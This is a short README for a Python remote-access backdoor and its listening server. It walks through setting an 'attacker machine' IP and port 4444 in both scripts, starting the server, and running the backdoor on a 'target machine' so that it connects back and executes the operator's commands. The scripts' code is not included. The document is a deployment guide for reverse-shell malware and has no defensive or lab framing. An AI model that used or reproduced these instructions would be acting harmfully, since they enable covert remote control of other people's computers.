This project contains a Python backdoor and server script that work together to establish a remote connection between a target machine and an operator. The backdoor runs on the target, connecting back to the server, which listens for incoming connections. 
Once connected, the server can send commands to the backdoor, which executes them on the target and returns the output.

Instructions:

1. Install Python 3
  
2. Installer termcolor: pip install termcolor

3. Configure the Server:
  Open server.py and set:
    IP address: The server’s local or public IP.
    Port: An open TCP port (e.g., 4444).
      Example in code:
        host = "192.168.1.10"  # your attacker machine IP
        port = 4444

4. Configure the Backdoor:
   In backdoor.py, set:
    The server IP to point to your attacker machine. The port to match the server port.
      Example:
        server_ip = "192.168.1.10"
        server_port = 4444

5. Run the Server: python3 server.py

6. Deploy the Backdoor:
   Run backdoor.py on the target machine:
    python3 backdoor.py


Once it connects, the server will show: [+] Connection established with <target_ip>
